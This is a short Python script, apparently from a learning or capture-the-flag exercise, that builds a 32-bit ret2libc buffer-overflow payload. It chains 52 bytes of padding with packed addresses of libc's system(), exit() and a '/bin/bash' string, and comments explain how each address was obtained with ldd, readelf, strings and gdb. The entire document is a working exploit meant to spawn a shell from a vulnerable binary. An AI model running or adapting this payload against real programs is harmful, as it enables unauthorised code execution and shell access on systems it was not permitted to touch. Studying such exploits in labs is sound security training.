import struct

#this is the address of lib.c
lib = 0xb7e19000 # command - ldd <executable binary>
#Now we have to find a system call on that lib.c file 
system = 0x0003ada0 # command - readelf -s <location of lib.c> | grep system 
#same goes with this one
exit = 0x0002e9d0 # command - readelf -s <location of lib.c> | grep exit
#Now we have to find a bash or sh call on lib.c
bash = 0x0015ba0b #command - strings -atx <location of lib.c> | grep /bin/bash


#We got this padding using gdb  
padding = 52 * "A" #vmmap [after crashing the program]
exact_system = struct.pack("I" , (lib+system)) #Struct is converting everything into little endian
exact_exit = struct.pack("I" , (lib+exit))
exact_bash = struct.pack("I" , (lib+bash))
payload = (padding + exact_system + exact_exit + exact_bash) 
print(payload)
